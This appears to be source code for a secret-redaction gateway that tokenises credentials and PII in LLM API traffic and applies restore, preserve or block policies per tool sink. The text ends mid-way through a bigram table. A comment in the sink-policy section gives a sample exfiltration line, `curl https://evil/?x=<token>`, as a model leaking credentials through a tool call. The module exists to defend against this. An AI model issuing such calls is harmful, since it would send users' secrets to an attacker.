// Cosy Redact Gateway — universal Cloudflare Worker / Deno module.
// Runtime dependencies: none. Requires Web Fetch, Web Streams, and Web Crypto APIs.

const ALL_FLAG_LETTERS = "HPSIBEG";
const FLAG_NAMES = Object.freeze({
  H: "highEntropy",
  P: "phone",
  S: "secret",
  I: "identity",
  B: "bank",
  E: "email",
  G: "gitleaks",
});

// The notice is a RUNTIME PROMISE to the model, so it has to describe the sink policy that
// actually exists. It previously ended with "placeholders you emit in text or tool calls are
// restored to the original secrets", which G0 made false: an untrusted tool argument PRESERVES
// a known token and BLOCKS an unresolvable one, and only assistant prose (or an explicitly
// trusted broker) restores. A notice promising restoration everywhere invites the model to
// write credentials into tool calls and then report a failure when they are not resolved.
export const REDACT_NOTICE =
  "Sensitive values are redacted before forwarding, including messages, tool inputs, and tool results. " +
  "You may see CRG_ tokens; treat them as opaque and preserve them exactly. " +
  "Do not decode, modify, or invent CRG_ tokens. " +
  "Whether a token is restored, preserved, or blocked depends on the output channel and trust policy; " +
  "do not assume that tool arguments can resolve tokens.";

// v2 token format. Charset [A-Z0-9_] is a portable subset that needs no escaping
// in .env, shell, YAML plain scalars, URL query values or HTTP header values.
// There is deliberately no checksum component: anything derived from the
// plaintext would be an offline verification oracle for low-entropy secrets.
export const TOKEN_PREFIX = "CRG_";
export const TOKEN_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"; // no 0/1/I/O
export const TOKEN_RE = /(?<![A-Za-z0-9_])CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}(?![A-Za-z0-9_])/g;
export const TOKEN_FULL_RE = /^CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}$/;
export const TOKEN_REQUEST_ID_WIDTH = 6;
export const TOKEN_ENTITY_ID_WIDTH = 4;
// Derived, never hardcoded: a stale literal here makes streaming tests fail in a
// confusing way (the assertion throws inside the upstream fetch callback and the
// request degrades to a 502 with an empty stream).
export const TOKEN_LENGTH = TOKEN_PREFIX.length + TOKEN_REQUEST_ID_WIDTH + 1 + TOKEN_ENTITY_ID_WIDTH;

// Prefixes that may appear in an already-redacted payload. Protected-span eligibility is
// NOT "matches a CRG-shaped regex" -- see RedactionContext.

// Format-agnostic helpers for callers and tests, so that neither has to hardcode
// a token shape. REDACTED_TOKEN is global; REDACTED_TOKEN_ONE is not.
export const REDACTED_TOKEN = /(?<![A-Za-z0-9_])CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}(?![A-Za-z0-9_])/g;
export const REDACTED_TOKEN_ONE = /(?<![A-Za-z0-9_])CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}(?![A-Za-z0-9_])/;
export function isRedactedText(value) {
  if (typeof value !== "string") return false;
  REDACTED_TOKEN_ONE.lastIndex = 0;
  return REDACTED_TOKEN_ONE.test(value);
}


// ---------------------------------------------------------------- sink policy ---

// Tool Sink Policy (DESIGN-v2.md section 6.8).
//
// An unknown token that is protected-token-LIKE is not merely "a string we could
// not map". In assistant prose it is inert text. In a sensitive sink it is a
// directive whose operand cannot be resolved: restoring it is impossible (no
// mapping entry) and forwarding it unchanged sends a token downstream where it
// has no meaning. Blocking is the only honest outcome.
//
// The condition requires all three at once, so ordinary identifiers -- trace ids,
// request ids, opaque application ids, cloud resource names -- are never caught:
//   1. the token is unknown to this request's mapping
//   2. it is protected-token-like (see PROTECTED_TOKEN_LIKE_RE)
//   3. the sink is sensitive
export const SENSITIVE_SINK_KINDS = Object.freeze([
  "shell",
  "network_egress",
  "database",
  "email",
]);

// Deliberately narrow. A shape that merely looks "random" is not enough: the
// point is to recognise our own (and a registered foreign namespace's) token
// dialect, not to guess at opaque identifiers in general.
export const PROTECTED_TOKEN_LIKE_RE =
  /(?<![A-Za-z0-9_])CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}(?![A-Za-z0-9_])/;

export function isProtectedTokenLike(value) {
  return typeof value === "string" && PROTECTED_TOKEN_LIKE_RE.test(value);
}

export const RESTORE_ACTION = Object.freeze({
  RESTORE: "restore",
  PRESERVE: "preserve",
  BLOCK: "block",
});

// A sink is trusted only when it is explicitly declared so (e.g. a local broker
// that owns its own credential injection). Default deny: guessing "trusted" fails
// open (exfiltration), guessing "untrusted" only leaves a token in place.
function isTrustedSink(sink) {
  return sink?.trust === "trusted";
}

// ------------------------------------------------------------------ ownership ---

export const TOKEN_OWNERSHIP = Object.freeze({
  OWN: "OWN",
  FOREIGN_REGISTERED: "FOREIGN_REGISTERED",
  UNKNOWN: "UNKNOWN",
});

// THIS layer's dialect only. Used to decide whether an unknown string is
// "protected-token-like" for the unknown-token branch of the restore policy.
function isOwnDialectToken(value) {
  return typeof value === "string"
    && PROTECTED_TOKEN_LIKE_RE.test(value);
}

// A registered foreign namespace may legitimately use its OWN issuer-specific
// shape (ACME_DLP_7f3a…), so eligibility cannot require our dialect. It must
// still be token-shaped: uppercase/digits/underscore only, no separators that
// appear in infrastructure identifiers. Hyphens, colons, dots and spaces are
// excluded, which is what keeps `i-0a1b2c3d4e5f67890`,
// `arn:aws:iam::123456789012:role/...`, UUIDs and release names out -- those can
// never be claimed by a namespace matcher even if the config is over-broad.
const FOREIGN_TOKEN_SHAPE_RE = /^[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+$/;

function isRegisteredTokenLike(value) {
  return typeof value === "string"
    && (isOwnDialectToken(value) || FOREIGN_TOKEN_SHAPE_RE.test(value));
}

function normalizeForeignNamespace(pattern) {
  if (pattern instanceof RegExp) return pattern;
  if (pattern && typeof pattern === "object" && typeof pattern.pattern === "string") {
    return new RegExp(pattern.pattern, pattern.flags || "");
  }
  if (typeof pattern === "string") return new RegExp(pattern);
  // Must throw rather than stringify: `new RegExp(String(42))` silently yields a
  // matcher for the literal "42", which is a config bug that looks like it works.
  throw new TypeError("foreign namespace must be a RegExp or a pattern string");
}

// Namespaces are TRUSTED CONFIGURATION, not payload-derived data. A broad
// "anything that looks like CRG_*" matcher would recreate the bypass this design
// removed: whoever controls the payload could declare its own text foreign and
// have it pass through unscanned. Prefer issuer-specific prefixes, or exact token
// registration via tokens.
export class ForeignTokenRegistry {
  constructor(namespaces = []) {
    this.namespaces = namespaces.map((entry) => (
      typeof entry === "string"
        ? { name: entry, matcher: normalizeForeignNamespace(entry), streamPrefix: null }
        : {
            name: entry.name || String(entry.pattern),
            matcher: normalizeForeignNamespace(entry.pattern),
            // An explicit prefix used ONLY for streaming holdback. Deriving a possible
            // prefix from an arbitrary regex is not reliable, and a partial matcher is not
            // worth writing; the issuer states the prefix instead. Ownership is still
            // decided by the full matcher.
            streamPrefix: typeof entry.streamPrefix === "string" && entry.streamPrefix.length > 0
              ? entry.streamPrefix
              : null,
          }
    ));
    this.tokens = new Set();
  }
  /** Prefixes a streaming channel must hold back so a token cannot be split across chunks. */
  streamPrefixes() {
    const out = [...this.tokens];
    for (const ns of this.namespaces) if (ns.streamPrefix) out.push(ns.streamPrefix);
    return out;
  }
  registerTokens(tokens) {
    for (const token of tokens) this.tokens.add(token);
    return this;
  }
  /** @returns {string|null} the namespace name that claims this token, if any. */
  namespaceOf(token) {
    if (this.tokens.has(token)) return "exact";
    for (const ns of this.namespaces) if (ns.matcher.test(token)) return ns.name;
    return null;
  }
  has(token) { return this.namespaceOf(token) !== null; }
  get size() { return this.namespaces.length + this.tokens.size; }
}

// Whether an entity class requires protection at a sensitive sink.
//
// Renamed from `isCredentialRisk`: the predicate was never about credentials alone. Its
// OLD body returned false for PII, which was a latent hazard -- once the classifier
// starts labelling an email, a phone number, a national id or a bank card as PII, those
// entities would have been RELEASED into a sensitive sink precisely because they were
// classified correctly.
//
// "I do not know" and "I know it is sensitive" remain different states: the default
// class is UNKNOWN, and the POLICY is what treats UNKNOWN as sensitive (fail-closed).
export function requiresSinkProtection(entityClass) {
  return entityClass === undefined
    || entityClass === null
    || entityClass === ENTITY_CLASS.UNKNOWN
    || entityClass === ENTITY_CLASS.CREDENTIAL
    || entityClass === ENTITY_CLASS.PII;
}

/**
 * Resolve a visible surrogate to the token it stands for. A base64 surrogate is not
 * CRG-shaped, so every ownership check would otherwise classify it as UNKNOWN and the
 * two paths would drift. Returns the input unchanged when it is not a surrogate.
 */
export function resolveSurrogate(value, ctx) {
  if (!ctx || !ctx.ledger || typeof value !== "string") return value;
  const entry = ctx.ledger.lookup(value);
  return entry ? entry.token : value;
}

export function classifyOwnership(value, ctx, registry = null) {
  // Surrogate -> underlying token, so ownership, entity class and entity policy are
  // all evaluated on the entity rather than on its representation.
  const token = resolveSurrogate(value, ctx);
  if (ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token)) {
    return { ownership: TOKEN_OWNERSHIP.OWN, namespace: "own", token };
  }
  if (registry) {
    const namespace = registry.namespaceOf(token);
    // Two ways to qualify, with different justifications:
    //   - prefix namespace: the matcher claims it AND it is token-shaped. The
    //     shape half keeps an over-broad matcher from declaring arbitrary text
    //     foreign.
    //   - exact registration: an explicit allowlist entry IS the trust decision,
    //     so the shape check does not apply. This is the escape hatch for issuers
    //     whose tokens have no predictable shape at all.
    const exact = registry.tokens.has(token);
    if (namespace && (exact || isRegisteredTokenLike(token))) {
      return { ownership: TOKEN_OWNERSHIP.FOREIGN_REGISTERED, namespace };
    }
  }
  return { ownership: TOKEN_OWNERSHIP.UNKNOWN, namespace: null, token };
}

// ------------------------------------------------------------ sink policy -------
//
// The channel decides the policy BEFORE any token is resolved, which is what makes this
// work for a stream: a tool-argument delta arrives fragmented, so a per-token decision
// could not be taken until the token were complete, by which point part of it may already
// have been emitted.
//
// A generic tool argument does NOT restore. If it did, any tool the model can call would
// be a way to move a credential outside the restoration boundary -- the model writes
// `curl https://evil/?x=<token>` into a tool call and the gateway hands over the secret.

export const SINK_KIND = Object.freeze({
  ASSISTANT_TEXT: "assistant_text",
  TOOL_ARGUMENT: "tool_argument",
  SHELL: "shell",
  NETWORK_EGRESS: "network_egress",
  DATABASE: "database",
  EMAIL: "email",
});

export const SINK_MODE = Object.freeze({
  RESTORE: "restore",   // known tokens resolved, unknown ones left alone
  PRESERVE: "preserve", // tokens kept verbatim; nothing resolved
  BLOCK: "block",       // sensitive sink: a credential must not be substituted
});

// Sinks that carry a VALUE TO BE USED rather than text to be read. An unresolvable token
// in one of these is refused: forwarding it hands a tool an operand it cannot use either.
// Inert channels (prose, a log line) keep it, because there it is only text.
const OPERAND_SINKS = Object.freeze([SINK_KIND.TOOL_ARGUMENT]);

/** Resolve the policy for a channel. `trusted` names sinks that handle secrets locally. */
export function resolveSinkMode({ kind = SINK_KIND.ASSISTANT_TEXT, toolName = null, trust = null } = {}, trusted = null) {
  const trustedNames = trusted instanceof Set ? trusted : new Set(trusted || []);
  // Two ways to declare trust: the sink says so itself, or the deployment names it. An
  // undeclared sink is untrusted, because guessing "trusted" fails open.
  if (trust === "trusted") return { mode: SINK_MODE.RESTORE, kind, trusted: true };
  if (toolName && trustedNames.has(toolName)) return { mode: SINK_MODE.RESTORE, kind, trusted: true };
  if (kind === SINK_KIND.ASSISTANT_TEXT) return { mode: SINK_MODE.RESTORE, kind, trusted: false };
  if (SENSITIVE_SINK_KINDS.includes(kind)) return { mode: SINK_MODE.BLOCK, kind, trusted: false };
  // Everything else -- a generic tool argument, a log write, an unknown channel -- keeps
  // the token. Fail closed for anything we cannot vouch for.
  return { mode: SINK_MODE.PRESERVE, kind, trusted: false };
}

/** Ownership of one protected-looking token, in the three-way split. */
function ownershipOf(token, ctx, registry) {
  if (ctx && ctx.tokenToRaw.has(token)) return "OWN";
  if (registry && typeof registry.has === "function" && registry.has(token)) return "FOREIGN_REGISTERED";
  return "UNKNOWN";
}

/**
 * Tokens in the text that this layer cannot resolve, split by ownership.
 *
 * FOREIGN_REGISTERED is tracked separately from UNKNOWN because the two are refused in
 * different places: an operand the outer DLP owns is refused in an operand channel,
 * exactly like one nobody owns, but it is PRESERVED in prose.
 */
function classifyTokensIn(text, ctx, registry) {
  const owned = [];
  const foreign = [];
  const unknown = [];

  // Our own dialect, found by shape.
  for (const token of text.match(REDACTED_TOKEN) || []) {
    if (!isProtectedTokenLike(token)) continue;
    const ownership = ownershipOf(token, ctx, registry);
    if (ownership === "OWN") owned.push(token);
    else if (ownership === "FOREIGN_REGISTERED") foreign.push(token);
    else unknown.push(token);
  }

  // A registered foreign token is NOT our dialect, so the shape scan above cannot see it.
  // Without this the registry was plumbed through and then never consulted: the split
  // existed in the type system and nowhere in the decision.
  if (registry) {
    for (const token of registry.tokens) {
      let at = text.indexOf(token);
      while (at >= 0) {
        if (!foreign.includes(token)) foreign.push(token);
        at = text.indexOf(token, at + token.length);
      }
    }
    for (const ns of registry.namespaces) {
      ns.matcher.lastIndex = 0;
      for (const found of text.match(ns.matcher) || []) {
        if (!foreign.includes(found)) foreign.push(found);
      }
    }
  }
  return { owned, foreign, unknown };
}

/** True when a token this request never minted appears in the text. */
function hasUnknownProtectedToken(text, ctx, registry = null) {
  const { foreign, unknown } = classifyTokensIn(text, ctx, registry);
  return foreign.length > 0 || unknown.length > 0;
}

export const BLOCKED_OPERAND = "[blocked: unresolved token]";

/**
 * Apply the channel policy to one string.
 * @returns {{text: string, mode: string, blocked: boolean}}
 */
export function applySinkPolicy(text, ctx, sink = {}, trusted = null, registry = null) {
  const { mode } = resolveSinkMode(sink, trusted);
  if (mode === SINK_MODE.PRESERVE) {
    // A generic operand keeps its token. An UNKNOWN one is refused, because the tool
    // cannot resolve it either -- but only in an operand channel: a log line or other
    // inert text keeps it, since there it is just text and refusing would break ordinary
    // responses.
    // A FOREIGN_REGISTERED token is refused in an operand channel exactly like an
    // unclaimed one: the outer DLP is where the plaintext would appear, and this layer
    // cannot resolve it, so delivering it as an operand is not honest either.
    if (OPERAND_SINKS.includes(sink.kind) && hasUnknownProtectedToken(text, ctx, registry)) {
      return { text: BLOCKED_OPERAND, mode, blocked: true };
    }
    return { text, mode, blocked: false };
  }
  if (mode === SINK_MODE.BLOCK) {
    // Sensitive sink: an unresolvable operand is refused rather than forwarded, because a
    // shell, an egress call, a database or an email would receive a token it cannot use.
    if (hasUnknownProtectedToken(text, ctx, registry)) return { text: BLOCKED_OPERAND, mode, blocked: true };
    return { text, mode, blocked: false };
  }
  // RESTORE resolves only what this layer owns; restoreText leaves everything else
  // untouched, so a FOREIGN_REGISTERED token is preserved here too. Trusted does not mean
  // re-mapped.
  if (ctx && typeof ctx.foreignRegistry !== "undefined" && ctx.foreignRegistry && !registry) {
    registry = ctx.foreignRegistry;
  }
  void registry;
  return { text: ctx.restoreText(text), mode, blocked: false };
}

export function classifyRestore({ ctx, text, sink = { kind: SINK_KIND.ASSISTANT_TEXT }, registry = null, trusted = null }) {
  if (typeof text !== "string") throw new TypeError("classifyRestore requires text");
  // Delegates to applySinkPolicy so there is exactly ONE implementation of the channel
  // policy. The two used to be separate copies, which drifted the moment a generic tool
  // argument had to stop restoring: the helper looked correct while the response path
  // stayed unsafe.
  const { mode } = resolveSinkMode(sink, trusted);
  const unknownTokens = [];
  for (const token of text.match(REDACTED_TOKEN) || []) {
    if (ctx && typeof ctx.tokenToRaw?.has === "function" && ctx.tokenToRaw.has(token)) continue;
    if (isProtectedTokenLike(token) && !unknownTokens.includes(token)) unknownTokens.push(token);
  }

  const applied = ctx
    ? applySinkPolicy(text, ctx, sink, trusted, registry || ctx.foreignRegistry || null)
    : { text, mode, blocked: false };

  if (applied.blocked) {
    return {
      action: RESTORE_ACTION.BLOCK,
      text: applied.text,
      blockedTokens: unknownTokens,
      unknownTokens,
      registry,
      mode,
      telemetry: {
        event: mode === SINK_MODE.BLOCK ? "restore_blocked_untrusted_sink" : "restore_miss_blocked",
        sink: sink.kind,
        tokenShape: "protected",
      },
    };
  }
  // The action reports WHAT WAS DELIVERED, which is the only definition that cannot
  // drift:
  //   restore  -> tokens were resolved to plaintext
  //   preserve -> the text was delivered unchanged (including a sensitive channel, where
  //               the token is kept rather than substituted)
  //   block    -> the content was replaced with a marker because it could not be resolved
  //
  // An earlier revision reported `block` for any sensitive channel, which conflated "the
  // secret was not substituted" with "something was refused" and made the action name
  // depend on policy rather than on the outcome.
  // Derived from what the text became, not from the mode: a RESTORE channel that found
  // nothing to resolve delivered the text unchanged, so the honest action is `preserve`,
  // and the mode is reported separately to explain why.
  const action = applied.text !== text ? RESTORE_ACTION.RESTORE : RESTORE_ACTION.PRESERVE;
  return {
    action,
    text: applied.text,
    blockedTokens: [],
    unknownTokens,
    registry,
    mode,
    telemetry: unknownTokens.length
      ? { event: "restore_miss", sink: sink.kind, count: unknownTokens.length }
      : { event: "restore_ok", sink: sink.kind, count: action === RESTORE_ACTION.RESTORE ? 1 : 0 },
  };
}

const DEFAULT_MAX_BODY_BYTES = 16 * 1024 * 1024;
const DEFAULT_MAX_REDACTIONS = 16384;
const textEncoder = new TextEncoder();

function randomSalt() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
}

// One salt per runtime/isolate startup, as requested.
const RUNTIME_SALT = randomSalt();

export function parseFlags(raw) {
  const upper = (raw || "").toUpperCase();
  const letters = upper || ALL_FLAG_LETTERS;
  const unknown = [...letters].filter((c) => !(c in FLAG_NAMES));
  if (unknown.length) throw new Error(`Unknown flag(s): ${[...new Set(unknown)].join("")}`);
  const out = { highEntropy:false, phone:false, secret:false, identity:false, bank:false, email:false, gitleaks:false };
  for (const c of letters) out[FLAG_NAMES[c]] = true;
  return out;
}

export function parseProxyTarget(requestUrl) {
  const u = new URL(requestUrl);
  const routed = u.pathname + u.search;
  const dollar = routed.indexOf("$");
  if (dollar < 0) return null;
  const flagText = routed.slice(1, dollar);
  const upstreamText = routed.slice(dollar + 1);
  if (!upstreamText) throw new Error("Missing upstream URL after '$'");
  const upstream = new URL(upstreamText);
  if (upstream.protocol !== "https:" && upstream.protocol !== "http:") throw new Error("Only http/https upstream URLs are supported");
  if (upstream.username || upstream.password) throw new Error("Upstream URLs containing userinfo are not supported");
  return { flags: parseFlags(flagText), flagText: flagText || ALL_FLAG_LETTERS, upstream };
}

export function tokenizeBlocks(text) {
  const blocks = [];
  const re = /[A-Za-z0-9]+/g;
  let m;
  while ((m = re.exec(text))) blocks.push({ value:m[0], start:m.index, end:m.index + m[0].length });
  return blocks;
}

const ENTROPY_THRESHOLDS = [[9,5.424],[10,5.3667],[11,5.3423],[12,5.282],[13,5.2565],[16,5.1799],[20,5.0612],[24,4.9833],[32,4.8907],[40,4.8327],[48,4.7662],[56,4.7277],[64,4.7052],[80,4.6549],[96,4.6248],[112,4.5948],[128,4.566]];
const BIGRAM_COST = {"^":{"a":4.2164,"b":4.1407,"c":3.7977,"d":4.542,"e":4.8087,"f":4.696,"g":5.0298,"h":4.7512,"i":4.542,"j":6.1639,"k":6.2409,"l":4.4028,"m":4.1043,"n":4.9961,"o":5.0644,"p":3.6073,"q":7.2213,"r":4.7797,"s":3.3406,"t":3.9672,"u":5.3754,"v":6.2409,"w":4.338,"x":7.5727,"y":6.7028,"z":7.7869,"0":12.4307,"1":12.4307,"2":12.4307,"3":12.4307,"4":12.4307,"5":12.4307,"6":12.4307,"7":12.4307,"8":12.4307,"9":12.4307,"$":12.4307},"a":{"a":8.4726,"b":5.1033,"c":4.8223,"d":4.9283,"e":8.4726,"f":6.5981,"g":6.0278,"h":7.2502,"i":4.8743,"j":9.3206,"k":5.3027,"l":3.5288,"m":4.1427,"n":2.5524,"o":9.3206,"p":4.9843,"q":9.3206,"r":3.3525,"s":3.7296,"t":3.4477,"u":5.6201,"v":7.555,"w":6.9986,"x":7.9421,"y":6.1506,"z":7.2502,"0":11.6425,"1":11.6425,"2":11.6425,"3":11.6425,"4":11.6425,"5":11.6425,"6":11.6425,"7":11.6425,"8":11.6425,"9":11.6425,"$":2.9525},"b":{"a":2.9096,"b":7.302,"c":5.9234,"d":9.6239,"e":2.7535,"f":7.302,"g":9.6239,"h":7.302,"i":3.5154,"j":9.6239,"k":9.6239,"l":3.6015,"m":6.454,"n":9.6239,"o":3.0847,"p":7.302,"q":9.6239,"r":3.5154,"s":5.5364,"t":9.6239,"u":3.4341,"v":6.454,"w":7.302,"x":9.6239,"y":4.98,"z":9.6239,"0":9.6239,"1":9.6239,"2":9.6239,"3":9.6239,"4":9.6239,"5":9.6239,"6":9.6239,"7":9.6239,"8":9.6239,"9":9.6239,"$":3.284},"c":{"a":2.9129,"b":10.3805,"c":5.9881,"d":10.3805,"e":3.2824,"f":6.293,"g":10.3805,"h":2.9458,"i":4.1906,"j":10.3805,"k":4.1906,"l":4.2719,"m":8.0585,"n":8.0585,"o":2.3975,"p":6.293,"q":10.3805,"r":4.2719,"s":6.293,"t":4.1906,"u":6.293,"v":7.2105,"w":8.0585,"x":8.0585,"y":5.7366,"z":10.3805,"0":10.3805,"1":10.3805,"2":10.3805,"3":10.3805,"4":10.3805,"5":10.3805,"6":10.3805,"7":10.3805,"8":10.3805,"9":10.3805,"$":4.1137},"d":{"a":3.2104,"b":10.1762,"c":7.0062,"d":7.0062,"e":2.5837,"f":4.6843,"g":10.1762,"h":7.0062,"i":2.957,"j":10.1762,"k":10.1762,"l":6.0887,"m":6.4757,"n":6.4757,"o":3.0366,"p":6.0887,"q":7.8542,"r":5.5323,"s":4.8186,"t":6.4757,"u":4.5615,"v":10.1762,"w":10.1762,"x":6.4757,"y":7.0062,"z":10.1762,"0":10.1762,"1":10.1762,"2":10.1762,"3":10.1762,"4":10.1762,"5":10.1762,"6":10.1762,"7":10.1762,"8":10.1762,"9":10.1762,"$":2.2395},"e":{"a":3.9548,"b":5.984,"c":4.9959,"d":4.6956,"e":4.9959,"f":7.2709,"g":6.5572,"h":7.8273,"i":5.8924,"j":11.9148,"k":8.2143,"l":4.2353,"m":5.648,"n":3.2109,"o":7.5224,"p":5.5749,"q":8.2143,"r":2.5996,"s":3.3111,"t":4.3834,"u":7.2709,"v":5.5749,"w":7.2709,"x":5.8062,"y":6.5572,"z":8.2143,"0":11.9148,"1":11.9148,"2":11.9148,"3":11.9148,"4":11.9148,"5":11.9148,"6":11.9148,"7":11.9148,"8":11.9148,"9":11.9148,"$":2.4451},"f":{"a":3.5033,"b":9.2312,"c":6.9093,"d":9.2312,"e":3.7394,"f":4.1868,"g":6.9093,"h":9.2312,"i":2.3124,"j":9.2312,"k":9.2312,"l":5.1438,"m":5.5308,"n":9.2312,"o":2.8218,"p":6.0613,"q":9.2312,"r":3.6165,"s":6.9093,"t":3.8737,"u":4.1868,"v":9.2312,"w":9.2312,"x":9.2312,"y":6.0613,"z":9.2312,"0":9.2312,"1":9.2312,"2":9.2312,"3":9.2312,"4":9.2312,"5":9.2312,"6":9.2312,"7":9.2312,"8":9.2312,"9":9.2312,"$":3.3983},"g":{"a":3.9098,"b":6.7623,"c":9.9322,"d":9.9322,"e":2.6013,"f":7.6103,"g":4.8878,"h":3.274,"i":4.4404,"j":7.6103,"k":7.6103,"l":5.2884,"m":7.6103,"n":6.2318,"o":4.4404,"p":7.6103,"q":9.9322,"r":3.6654,"s":4.7228,"t":5.8448,"u":5.2884,"v":9.9322,"w":6.7623,"x":9.9322,"y":6.7623,"z":9.9322,"0":9.9322,"1":9.9322,"2":9.9322,"3":9.9322,"4":9.9322,"5":9.9322,"6":9.9322,"7":9.9322,"8":9.9322,"9":9.9322,"$":1.8824},"h":{"a":2.8766,"b":7.8492,"c":7.8492,"d":7.8492,"e":2.0164,"f":10.1712,"g":7.0013,"h":10.1712,"i":2.6713,"j":10.1712,"k":7.0013,"l":7.0013,"m":7.0013,"n":10.1712,"o":3.351,"p":7.8492,"q":10.1712,"r":4.9617,"s":7.8492,"t":3.9814,"u":4.5565,"v":6.0837,"w":10.1712,"x":10.1712,"y":6.0837,"z":10.1712,"0":10.1712,"1":10.1712,"2":10.1712,"3":10.1712,"4":10.1712,"5":10.1712,"6":10.1712,"7":10.1712,"8":10.1712,"9":10.1712,"$":2.9913},"i":{"a":3.6688,"b":4.6354,"c":3.9359,"d":4.7453,"e":4.9278,"f":5.6756,"g":4.8644,"h":11.4035,"i":8.2336,"j":7.7031,"k":7.0112,"l":4.0726,"m":4.4378,"n":2.0263,"o":4.3483,"p":5.9117,"q":9.0816,"r":4.9278,"s":3.6962,"t":4.0372,"u":7.0112,"v":5.9117,"w":8.2336,"x":8.2336,"y":11.4035,"z":6.5456,"0":11.4035,"1":11.4035,"2":11.4035,"3":11.4035,"4":11.4035,"5":11.4035,"6":11.4035,"7":11.4035,"8":11.4035,"9":11.4035,"$":4.6354},"j":{"a":2.5429,"b":7.4009,"c":7.4009,"d":7.4009,"e":5.079,"f":7.4009,"g":7.4009,"h":7.4009,"i":3.3134,"j":7.4009,"k":7.4009,"l":7.4009,"m":5.079,"n":7.4009,"o":4.231,"p":7.4009,"q":7.4009,"r":7.4009,"s":2.5429,"t":7.4009,"u":2.5429,"v":7.4009,"w":4.231,"x":7.4009,"y":7.4009,"z":7.4009,"0":7.4009,"1":7.4009,"2":7.4009,"3":7.4009,"4":7.4009,"5":7.4009,"6":7.4009,"7":7.4009,"8":7.4009,"9":7.4009,"$":4.231},"k":{"a":3.2587,"b":8.8734,"c":8.8734,"d":5.7035,"e":2.1053,"f":8.8734,"g":8.8734,"h":6.5515,"i":3.0406,"j":8.8734,"k":8.8734,"l":5.7035,"m":5.7035,"n":4.786,"o":5.173,"p":8.8734,"q":8.8734,"r":4.4811,"s":4.2296,"t":6.5515,"u":5.7035,"v":8.8734,"w":6.5515,"x":6.5515,"y":5.7035,"z":8.8734,"0":8.8734,"1":8.8734,"2":8.8734,"3":8.8734,"4":8.8734,"5":8.8734,"6":8.8734,"7":8.8734,"8":8.8734,"9":8.8734,"$":2.3343},"l":{"a":3.3336,"b":8.543,"c":7.695,"d":5.0321,"e":2.6506,"f":6.7775,"g":6.7775,"h":10.865,"i":2.6506,"j":10.865,"k":6.4726,"l":3.7254,"m":6.7775,"n":8.543,"o":3.0771,"p":8.543,"q":10.865,"r":8.543,"s":4.8426,"t":5.5074,"u":5.3731,"v":6.2211,"w":7.695,"x":8.543,"y":3.8537,"z":7.695,"0":10.865,"1":10.865,"2":10.865,"3":10.865,"4":10.865,"5":10.865,"6":10.865,"7":10.865,"8":10.865,"9":10.865,"$":3.0512},"m":{"a":2.2002,"b":4.7139,"c":7.8839,"d":6.5054,"e":2.392,"f":7.8839,"g":7.8839,"h":10.2058,"i":3.8659,"j":10.2058,"k":10.2058,"l":4.9963,"m":5.3478,"n":7.8839,"o":3.1946,"p":3.3856,"q":7.0359,"r":7.8839,"s":5.5619,"t":7.8839,"u":5.1614,"v":7.8839,"w":10.2058,"x":10.2058,"y":5.8135,"z":10.2058,"0":10.2058,"1":10.2058,"2":10.2058,"3":10.2058,"4":10.2058,"5":10.2058,"6":10.2058,"7":10.2058,"8":10.2058,"9":10.2058,"$":3.3856},"n":{"a":3.6551,"b":7.6621,"c":4.0679,"d":3.7404,"e":3.6278,"f":5.7478,"g":2.9154,"h":7.275,"i":3.9962,"j":7.6621,"k":5.7478,"l":6.7186,"m":11.3625,"n":5.5296,"o":4.6482,"p":7.275,"q":11.3625,"r":7.275,"s":4.5423,"t":3.4737,"u":6.7186,"v":6.0049,"w":9.0406,"x":11.3625,"y":6.0049,"z":9.0406,"0":11.3625,"1":11.3625,"2":11.3625,"3":11.3625,"4":11.3625,"5":11.3625,"6":11.3625,"7":11.3625,"8":11.3625,"9":11.3625,"$":2.3938},"o":{"a":5.8205,"b":6.5342,"c":5.5633,"d":4.9882,"e":7.0906,"f":6.5342,"g":5.1557,"h":8.0081,"i":6.5342,"j":8.8561,"k":6.5342,"l":4.2123,"m":4.08,"n":2.4198,"o":4.8382,"p":5.1557,"q":11.178,"r":3.0031,"s":4.8382,"t":4.0385,"u":3.527,"v":5.3452,"w":4.3077,"x":7.4776,"y":8.8561,"z":8.0081,"0":11.178,"1":11.178,"2":11.178,"3":11.178,"4":11.178,"5":11.178,"6":11.178,"7":11.178,"8":11.178,"9":11.178,"$":3.5856},"p":{"a":3.43,"b":7.9784,"c":6.2129,"d":5.0909,"e":2.934,"f":7.1304,"g":10.3004,"h":4.8085,"i":3.9605,"j":10.3004,"k":10.3004,"l":4.0336,"m":7.1304,"n":10.3004,"o":3.8246,"p":4.9428,"q":10.3004,"r":3.2451,"s":5.256,"t":4.5724,"u":5.6565,"v":10.3004,"w":10.3004,"x":7.1304,"y":2.3875,"z":10.3004,"0":10.3004,"1":10.3004,"2":10.3004,"3":10.3004,"4":10.3004,"5":10.3004,"6":10.3004,"7":10.3004,"8":10.3004,"9":10.3004,"$":4.4675},"q":{"a":4.5484,"b":6.8704,"c":6.8704,"d":4.5484,"e":6.8704,"f":6.8704,"g":6.8704,"h":6.8704,"i":6.8704,"j":6.8704,"k":6.8704,"l":3.7004,"m":6.8704,"n":6.8704,"o":6.8704,"p":6.8704,"q":6.8704,"r":4.5484,"s":6.8704,"t":6.8704,"u":1.2557,"v":6.8704,"w":6.8704,"x":6.8704,"y":6.8704,"z":6.8704,"0":6.8704,"1":6.8704,"2":6.8704,"3":6.8704,"4":6.8704,"5":6.8704,"6":6.8704,"7":6.8704,"8":6.8704,"9":6.8704,"$":3.1699},"r":{"a":3.2354,"b":7.1079,"c":5.5807,"d":5.4675,"e":2.4107,"f":7.1079,"g":6.3374,"h":8.8734,"i":3.4338,"j":11.1954,"k":5.9859,"l":5.2646,"m":5.0868,"n":6.151,"o":3.5443,"p":6.151,"q":11.1954,"r":7.4949,"s":4.1841,"t":4.5372,"u":4.9286,"v":7.1079,"w":6.5515,"x":11.1954,"y":5.4675,"z":11.1954,"0":11.1954,"1":11.1954,"2":11.1954,"3":11.1954,"4":11.1954,"5":11.1954,"6":11.1954,"7":11.1954